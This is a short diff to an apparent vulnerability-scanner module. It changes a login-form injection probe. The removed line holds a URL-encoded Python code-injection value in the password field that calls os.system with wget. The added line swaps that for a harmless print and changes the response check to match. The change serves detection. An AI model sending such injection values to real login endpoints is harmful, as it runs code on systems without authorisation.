@@ -45,7 +45,7 @@ payloads:
               ports:
                 - 80
                 - 443
-        data: username=root&password=123%5C%22%2C%5C%22%246%24%24%5C%22%29%29%3Bimport%20os%3Bos.system%28%5C%22wget%20http%3A%2F%2F%7B%7B{target}%7D%7D%5C%22%29%3Bprint%28crypt.crypt%28%5C%22
+        data: username=root&password=123%5C%22%2C%5C%22%246%24%24%5C%22%29%29%3Bprint%28%22%5Cx6e%5Cx65%5Cx74%5Cx74%5Cx61%5Cx63%5Cx6b%5Cx65%5Cx72%22%29%3Bprint%28crypt.crypt%28%5C%22
         response:
           condition_type: and
           conditions:
@@ -53,5 +53,5 @@ payloads:
               regex: "200"
               reverse: false
             content:
-              regex: "http"
+              regex: "nettacker"
               reverse: false
